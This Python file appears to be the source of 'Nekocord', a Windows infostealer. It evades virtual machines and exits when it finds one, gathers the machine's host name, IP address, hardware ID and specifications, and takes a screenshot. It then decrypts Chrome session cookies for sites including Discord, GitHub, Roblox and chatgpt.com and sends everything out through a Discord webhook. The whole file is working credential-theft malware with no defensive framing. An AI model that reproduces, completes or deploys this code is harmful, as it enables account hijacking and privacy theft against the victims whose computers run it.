import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import shutil
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

host = socket.gethostname()
ip = socket.gethostbyname(host)

types = "@here"
h00k = ""

os.system("TASKKILL /F /IM chrome.exe") 

def is_admin():
    try:
        return os.geteuid() == 0 
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0 
    
def run_as_admin():
    script = sys.argv[0]
    params = " ".join(sys.argv[1:])
    
    if sys.platform == "win32":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    else:
        sys.exit(1)

def iplogger():
    data = {
        "username": "Nekocord | Address",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png", 
        "embeds": [{
            "title": "🏠️ IP INFO",
            "fields": [
                {
                    "name": "💻️ Host Name",
                    "value": f"{host}",
                    "inline": True
                },
                {
                    "name": "👀 IP Address",
                    "value": f"||{ip}||",
                    "inline": True
                },
            ],
            "footer": {
                "text": "nekocord. | https://github.com/zakocord/Nekocord"
            }
        }]
    }
    response = requests.post(h00k, json=data)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu_info = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    data2 = {
        "username": "Nekocord | Machine", 
        "content": f"{types}",
        "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "💻️ PC",
                        "value": f"`{pc_name}`",
                        "inline": False
                    },
                    {
                        "name": "⌨️ OS: ",
                        "value": f"`{os_name}`",
                        "inline": False
                    },
                    {
                        "name": "📝 RAM",
                        "value": f"`{total_gb}GB`",
                        "inline": False
                    },
                    {
                        "name": "📺️ GPU",
                        "value": f"`{GPUm}`",
                        "inline": False
                    },
                    {
                        "name": "🖲️ CPU",
                        "value": f"`{cpu_info}`",
                        "inline": False
                    },
                    {
                        "name": "🔏 HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": False
                    }                       
                ],
                "footer": {
                    "text": "nekocord. | https://github.com/zakocord/Nekocord"
                }   
            }
        ]
    } 

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=10):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Nekocord | Screenshot", 
            "content": f"📸 Screenshot",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass


def is_virtual_machine_windows():
    try:
        command = [
            "powershell",
            "-Command",
            "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model"
        ]
        output = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode().strip().lower()

        vm_keywords = ["virtual", "vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v", "parallels"]
        for keyword in vm_keywords:
            if keyword in output:
                pass
                return True
    except Exception as e:
        pass
    return False

def checker():
    is_vm = False


    hostname = socket.gethostname()
    if hostname.lower() == "apponfly-vps":
        pass
        is_vm = True


    if is_virtual_machine_windows():
        is_vm = True

    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe"]
    try:
        tasks = os.popen("tasklist").read().lower()
        for proc in suspicious_processes:
            if proc in tasks:
                pass
                is_vm = True
    except Exception as e:
        pass

    if is_vm:
        data_VM = {
            "username": "Nekocord | VM Detection",
            "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
        }

        try:
            requests.post(h00k, json=data_VM)
            time.sleep(2)
        except Exception as e:
            pass
        sys.exit(1)


def cookie_webhook(webhook_url, cookies_file=None, status=None):
    if status:
        response = requests.post(webhook_url, json={
            "username": "Nekocord | Cookie",
            "avatar_url": "https://i.imgur.com/VF1uUWN.png",
            "embeds": [{
                "title": "🍪 Cookie",
                "description": "\n".join(status),
            }]
        })
        if response.status_code == 204:
            pass
        else:
            pass
    elif cookies_file:
        with open(cookies_file, 'rb') as f:
            files = {'file': (os.path.basename(cookies_file), f)}
            response = requests.post(webhook_url, files=files)
            if response.status_code == 204:
                pass
            else:
                pass


def chrome_key():
    path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State")
    with open(path, "r", encoding="utf-8") as f:
        key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_cookie(enc, key):
    try:
        if enc[:3] == b'v10' or enc[:3] == b'v11':  
            iv = enc[3:15]
            payload = enc[15:-16]
            tag = enc[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
            return cipher.decrypt_and_verify(payload, tag).decode()
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
    except Exception as e:
        pass
        return None

def extract_cookies(domains, webhook):
    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
    all_cookies = []
    all_status = []

    profiles = [folder for folder in os.listdir(user_data_dir) if folder.startswith("Profile") and os.path.isdir(os.path.join(user_data_dir, folder))]
    
    for domain in domains:
        cookies = []
        status = []
        cookies_file = ""

        for profile in profiles:
            db_path = os.path.join(user_data_dir, f"{profile}\\Network\\Cookies")
            if not os.path.exists(db_path):
                continue
            shutil.copy2(db_path, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ?", (f"%{domain}%",))
            key = chrome_key()

            for host, name, enc in cur.fetchall():
                decrypted_cookie = decrypt_cookie(enc, key)
                if decrypted_cookie:
                    cookies.append(f"{host} | {name} = {decrypted_cookie}")
                    status.append(f"🟢 {host} | {name}")
                else:
                    cookies.append(f"{host} | {name} | ERROR")
                    status.append(f"🔴 {host} | {name} | ERROR")

            conn.close()
            os.remove("temp.db")

        if not cookies:
            pass
            cookies_file = os.path.join(os.environ['TEMP'], f"{domain}_cookies_backup.db")
            shutil.copy2(db_path, cookies_file)
            cookie_webhook(webhook, cookies_file)
        else:
            print(f"\n{domain} のCookies:\n" + "\n".join(cookies))
            all_cookies.extend(cookies)
            all_status.extend(status)

       
        if all_status:
            cookie_webhook(webhook, None, all_status)

def main():
    domains = ["roblox.com", "Discord", "x.com", "youtube.com", "github.com", "chatgpt.com"]

    checker()
    machineinfo()
    iplogger()
    screenshot()
    extract_cookies(domains, h00k)

main()
